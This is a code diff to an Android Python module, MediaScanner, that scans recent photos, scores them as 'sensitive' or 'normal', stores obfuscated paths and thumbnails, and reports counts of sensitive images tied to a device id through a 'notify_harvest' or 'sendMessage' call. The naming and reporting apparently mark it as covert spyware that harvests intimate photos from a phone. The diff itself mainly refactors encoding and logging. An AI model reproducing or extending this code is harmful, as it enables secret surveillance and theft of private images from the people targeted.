@@ -25,7 +25,12 @@ DB = os.path.join(P, "m_arch.db")
 if not os.path.exists(P):
     os.makedirs(P)
 
-logging.basicConfig(filename=os.path.join(P, "s.log"), level=logging.ERROR, filemode='a')
+logging.basicConfig(
+    filename=os.path.join(P, "s.log"),
+    level=logging.ERROR,
+    filemode='a',
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
 
 try:
     from jnius import autoclass
@@ -55,35 +60,36 @@ class MediaScanner:
         except:
             pass
 
-    # ========== نظام تشفير محسّن (Base64 + XOR بسيط) ==========
+    # ========== نظام تشفير محسّن (Base64 فقط، بدون XOR) ==========
     def _enc(self, text: str) -> str:
-        """تشفير المسار باستخدام Base64 + XOR"""
+        """
+        تشفير المسار باستخدام Base64 فقط (آمن ولا يعتمد على XOR).
+        يعيد النص المشفر أو النص الأصلي في حالة الخطأ.
+        """
         try:
             if not text:
                 return ""
-            # XOR بسيط مع مفتاح مشتق من المسار نفسه
-            key = hashlib.md5(text.encode()).digest()[:8]
-            data = text.encode()
-            xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
-            return base64.urlsafe_b64encode(xored).decode()
-        except:
-            return text
+            # تحويل النص إلى بايتات ثم تشفيره بـ Base64
+            data = text.encode('utf-8')
+            return base64.urlsafe_b64encode(data).decode()
+        except Exception as e:
+            logging.error(f"Encoding error: {e}")
+            return text  # في حالة الفشل، نعيد النص الأصلي
 
     def _dec(self, enc_text: str) -> str:
-        """فك تشفير المسار"""
+        """
+        فك تشفير المسار باستخدام Base64 فقط.
+        يعيد النص المفكوك أو النص المشفر الأصلي في حالة الخطأ.
+        """
         try:
             if not enc_text:
                 return ""
-            xored = base64.urlsafe_b64decode(enc_text.encode())
-            # استعادة المفتاح من البيانات المشفرة (غير ممكن بدون النص الأصلي)
-            # لذا نستخدم Base64 فقط كـ fallback
-            return xored.decode()
-        except:
-            try:
-                # محاولة فك Base64 فقط
-                return base64.urlsafe_b64decode(enc_text.encode()).decode()
-            except:
-                return enc_text
+            # فك تشفير Base64 ثم تحويله إلى نص
+            data = base64.urlsafe_b64decode(enc_text.encode())
+            return data.decode('utf-8')
+        except Exception as e:
+            logging.error(f"Decoding error: {e}")
+            return enc_text  # في حالة الفشل، نعيد النص المشفر
 
     # ========== إدارة قاعدة البيانات ==========
     def _init_db(self):
@@ -105,7 +111,10 @@ class MediaScanner:
             logging.error(f"DB Init error: {e}")
 
     def _partial_hash(self, path: str) -> str:
-        """حساب هاش جزئي للملف (الأول 2KB + الحجم + التاريخ)"""
+        """
+        حساب هاش جزئي للملف (الأول 2KB + الحجم + التاريخ).
+        يعيد الهاش أو None في حالة الخطأ.
+        """
         try:
             if not os.path.exists(path):
                 return None
@@ -114,7 +123,8 @@ class MediaScanner:
             with open(path, "rb") as f:
                 head = f.read(2048)
             return hashlib.md5(head + base.encode()).hexdigest()
-        except:
+        except Exception as e:
+            logging.error(f"Hash error: {e}")
             return None
 
     def _safe_path(self, path: str) -> bool:
@@ -138,7 +148,8 @@ class MediaScanner:
         try:
             from android.permissions import check_permission, Permission
             return check_permission(Permission.READ_EXTERNAL_STORAGE)
-        except:
+        except Exception as e:
+            logging.error(f"Permission check error: {e}")
             return True
 
     # ========== مسح سريع لآخر 48 ساعة ==========
@@ -146,11 +157,11 @@ class MediaScanner:
         """مسح سريع للصور الجديدة"""
         if not JNI:
             return []
-            
+
         if not self._check_storage_permission():
             logging.warning("Storage permission not granted")
             return []
-            
+
         cursor = None
         results = []
         try:
@@ -189,7 +200,7 @@ class MediaScanner:
         """معالجة الملفات المكتشفة وتصنيفها"""
         if not paths:
             return
-            
+
         with self._active_lock:
             if self.active:
                 return
@@ -200,7 +211,7 @@ class MediaScanner:
 
         try:
             now = int(time.time())
-            
+
             with _db_lock:
                 with sqlite3.connect(DB, check_same_thread=False) as conn:
                     for p in paths:
@@ -208,7 +219,7 @@ class MediaScanner:
                             # التحقق من وجود الملف
                             if not os.path.exists(p):
                                 continue
-                                
+
                             h = self._partial_hash(p)
                             if not h:
                                 continue
@@ -235,7 +246,6 @@ class MediaScanner:
                                         score = prob
                                         sensitive_count += 1
                                     else:
-                                        # صورة عادية - تخزينها كـ normal
                                         cat = 'normal'
                                         score = prob
                                 except Exception as e:
@@ -249,15 +259,15 @@ class MediaScanner:
                                 (h, self._enc(p), now, cat, score, fsize)
                             )
                             processed += 1
-                            
+
                             # تنظيف كل 20 ملف
                             if processed % 20 == 0:
                                 gc.collect()
-                                
+
                         except Exception as e:
                             logging.error(f"Process file error: {e}")
                             continue
-                            
+
                     conn.commit()
 
             # إشعار بالصور الحساسة المكتشفة
@@ -266,7 +276,6 @@ class MediaScanner:
                     if hasattr(self.ui, 'notify_harvest'):
                         self.ui.notify_harvest(self.did, sensitive_count)
                     elif hasattr(self.ui, '_api'):
-                        # إرسال إشعار مباشر
                         ctrl = getattr(self.ui, 'ctrl', None)
                         if ctrl:
                             self.ui._api("sendMessage", {
@@ -288,7 +297,7 @@ class MediaScanner:
         """إنشاء صورة مصغرة للملف"""
         if not JNI or not os.path.exists(path) or not self._is_image_file(path):
             return None
-            
+
         cursor = None
         try:
             # تنظيف المصغرات القديمة (أكثر من 10 دقائق)
@@ -306,7 +315,7 @@ class MediaScanner:
             BitmapFactory = autoclass('android.graphics.BitmapFactory')
             CompressFormat = autoclass('android.graphics.Bitmap$CompressFormat')
             FileOutputStream = autoclass('java.io.FileOutputStream')
-            
+
             act = autoclass('org.kivy.android.PythonActivity').mActivity
             resolver = act.getContentResolver()
 
@@ -317,16 +326,16 @@ class MediaScanner:
             if cursor and cursor.moveToFirst():
                 idx_id = cursor.getColumnIndex("_id")
                 img_id = cursor.getLong(idx_id)
-                
+
                 options = BitmapFactory.Options()
                 options.inSampleSize = 4  # تقليل الحجم أكثر
-                
+
                 bitmap = MediaStore.Images.Thumbnails.getThumbnail(
                     resolver, img_id,
                     MediaStore.Images.Thumbnails.MINI_KIND,
                     options
                 )
-                
+
                 if bitmap:
                     out_path = os.path.join(P, f"th_{int(time.time())}_{random.randint(1000,9999)}.jpg")
                     fos = FileOutputStream(out_path)
@@ -334,10 +343,10 @@ class MediaScanner:
                     fos.flush()
                     fos.close()
                     bitmap.recycle()
-                    
+
                     if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
                         return out_path
-                        
+
         except Exception as e:
             logging.error(f"Thumb error: {e}")
         finally:
@@ -356,10 +365,10 @@ class MediaScanner:
             limit = 16
         if not isinstance(page, int) or page < 0:
             page = 0
-            
+
         offset = page * limit
         results = []
-        
+
         try:
             with _db_lock:
                 with sqlite3.connect(DB, check_same_thread=False) as conn:
@@ -369,7 +378,7 @@ class MediaScanner:
                     )
                     rows = cur.fetchall()
                     to_delete = []
-                    
+
                     for i, row in enumerate(rows):
                         try:
                             path = self._dec(row[1])
@@ -387,15 +396,15 @@ class MediaScanner:
                         except Exception as e:
                             logging.error(f"Gallery row error: {e}")
                             to_delete.append((row[0],))
-                    
+
                     # حذف الملفات غير الموجودة دفعة واحدة
                     if to_delete:
                         conn.executemany("DELETE FROM media WHERE h=?", to_delete)
                         conn.commit()
-                        
+
         except Exception as e:
             logging.error(f"Gallery error: {e}")
-            
+
         return results
 
     # ========== تحديث فئة ملف ==========
@@ -403,7 +412,7 @@ class MediaScanner:
         """تحديث تصنيف ملف"""
         if not file_hash:
             return
-            
+
         try:
             with _db_lock:
                 with sqlite3.connect(DB, check_same_thread=False) as conn:
@@ -460,20 +469,20 @@ class MediaScanner:
                                 to_del.append((h,))
                         except:
                             to_del.append((h,))
-                    
+
                     if to_del:
                         conn.executemany("DELETE FROM media WHERE h=?", to_del)
-                        
+
                     # حذف الأقدم من 5000 صورة
                     conn.execute("""
                         DELETE FROM media WHERE h NOT IN 
                         (SELECT h FROM media ORDER BY ts DESC LIMIT 5000)
                     """)
-                    
+
                     # VACUUM لتحسين المساحة
                     conn.execute("VACUUM")
                     conn.commit()
-                    
+
         except Exception as e:
             logging.error(f"Cleanup error: {e}")
         finally:
@@ -484,12 +493,12 @@ class MediaScanner:
         """تشغيل مسح جديد"""
         if cleanup_first:
             self._cleanup_db()
-            
+
         def _task():
             files = self._fast_scan(limit=100)
             if files:
                 self._process_files(files)
-                
+
         threading.Thread(target=_task, daemon=True).start()
 
 
